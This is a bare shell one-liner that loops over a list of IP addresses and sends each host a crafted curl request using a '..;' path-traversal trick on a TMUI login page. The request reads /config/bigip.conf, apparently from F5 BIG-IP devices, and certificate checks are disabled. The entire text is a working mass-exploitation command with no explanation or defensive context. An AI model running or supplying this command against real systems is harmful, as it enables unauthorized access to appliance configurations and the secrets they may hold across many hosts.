for URL in `cat ips.txt`; do curl -v -k "${URL}:9797/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf";done
